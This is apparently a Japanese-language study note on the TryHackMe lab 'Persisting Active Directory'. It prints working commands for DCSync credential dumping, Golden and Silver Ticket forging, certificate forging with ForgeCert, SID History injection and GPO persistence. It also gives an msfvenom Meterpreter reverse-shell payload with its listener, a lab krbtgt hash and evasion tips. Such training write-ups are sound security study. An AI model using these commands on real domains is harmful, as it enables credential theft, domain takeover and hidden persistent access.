# Persisting Active Directory

## 概要
Active Directoryに対するPersistence（永続化）技術を学ぶルーム。
ブルーチームにキックアウトされないための手法を実践形式で学習。

- **カテゴリ**: CompTIA Pentest+ / Attacks and Exploits
- **難易度**: 中級
- **学習時間**: 120分
- **完了日**: 2026年4月9日

---

## 学んだ技術・攻撃手法

### 1. Persistence through Credentials（Task 2）
- **DC Sync攻撃**: Mimikatzを使用してドメイン全認証情報をダンプ
- ドメイン管理者権限でMimikatzを実行し、全ユーザーのNTLMハッシュを取得

### 2. Persistence through Tickets（Task 3）
- **Golden Ticket**: krbtgtのNTLMハッシュを使いTGTを偽造
- **Silver Ticket**: マシンアカウントのNTLMハッシュを使いTGSを偽造

| | Golden Ticket | Silver Ticket |
|---|---|---|
| 偽造対象 | TGT | TGS |
| 必要なハッシュ | krbtgt NTLM | マシンアカウント NTLM |
| スコープ | ドメイン全体 | 特定サーバーのみ |
| DCとの通信 | あり | なし（検知困難） |
| 有効期限（Mimikatz既定） | 10年 | 10年 |

### 3. Persistence through Certificates（Task 4）
- **AD CS悪用**: CAの秘密鍵を盗みForgeCertで任意ユーザーの証明書を偽造
- 認証情報をローテーションしても証明書は有効のまま

### 4. Persistence through SID History（Task 5）
- 低権限アカウントのSID HistoryにDomain Admins SIDを注入
- ログオン時のみSIDがトークンに追加されるため通常のグループ確認では検知不可

### 5. Persistence through Group Membership（Task 6）
- ネストされたグループを悪用してDomain Admins権限を取得
- Domain Adminsへの直接追加アラートを回避

### 6. Persistence through ACLs（Task 7）
- AdminSDHolderのACLに低権限ユーザーのFull Controlを追加
- SDPropが60分ごとに全Protected Groupsに変更を伝播

### 7. Persistence through GPOs（Task 8）
- GPOにLogon Scriptを仕込みMeterpreterシェルを取得
- DelegationからAuthenticated UsersをDomain Computersに変更して隠蔽

---

## 使用したコマンド

### DC Sync（Mimikatz）
```
# 単一ユーザーのDCSync
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<username>

# 全ユーザーのDCSync（ログ付き）
mimikatz # log <username>_dcdump.txt
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

### Golden Ticket（Mimikatz）
```
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT> /endin:600 /renewmax:10080 /ptt
```

### Silver Ticket（Mimikatz）
```
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname> /rc4:<NTLM hash of machine account> /service:cifs /ptt
```

### AD CS - 秘密鍵の抽出（Mimikatz）
```
mimikatz # crypto::certificates /systemstore:local_machine
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
```

### ForgeCertで証明書偽造
```
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=vuln --SubjectAltName <username>@za.tryhackme.loc --NewCertPath <username>.pfx --NewCertPassword Password123
```

### Rubeusでチケット取得
```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path> /password:<password> /outfile:<output> /domain:za.tryhackme.loc /dc:<DC IP>
```

### チケットの注入（Mimikatz）
```
mimikatz # kerberos::ptt ticket.kirbi
```

### SID History注入（DSInternals）
```powershell
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName '<low-priv user>' -SidHistory '<SID to add>' -DatabasePath 'C:\Windows\NTDS\ntds.dit'
Start-Service -Name ntds
```

### AdminSDHolder ACL追加（MMC）
```powershell
# SDPropを手動実行
Import-Module .\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation
```

### GPO作成
```powershell
# Meterpreterペイロード生成
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe

# MSFリスナー起動
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445; exploit"
```

---

## 取得したフラグ・重要情報

| 項目 | 値 |
|---|---|
| krbtgt NTLMハッシュ | `16f9af38fca3ada405386b3b57366082` |
| Domain SID | `S-1-5-21-3885271727-2693558621-2658995185` |

---

## PT0-003との関連

| 試験ドメイン | 関連技術 |
|---|---|
| Attacks & Exploits | Golden/Silver Ticket, DC Sync, AD CS |
| Post-Exploitation | SID History, Group Nesting, ACL, GPO |
| Vulnerability Discovery | AdminSDHolder, NTDS.dit |

### 重要ポイント
- **Golden Ticket**はBlue Teamがkrbtgtパスワードを2回ローテーションしないと無効化できない
- **Silver Ticket**はDCにログが残らないため検知が最も困難
- **AD CS Persistence**はルートCA証明書を失効させるしか対処法がない
- **SID History**はログオン時のみ適用されるため通常の監査では見つからない
- **GPO Persistence**はAuthenticated UsersをDomain Computersに変更すると読取り不可になる

---

## 参考リンク
- [TryHackMe - Persisting Active Directory](https://tryhackme.com/room/persistingad)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
- [ForgeCert](https://github.com/GhostPack/ForgeCert)
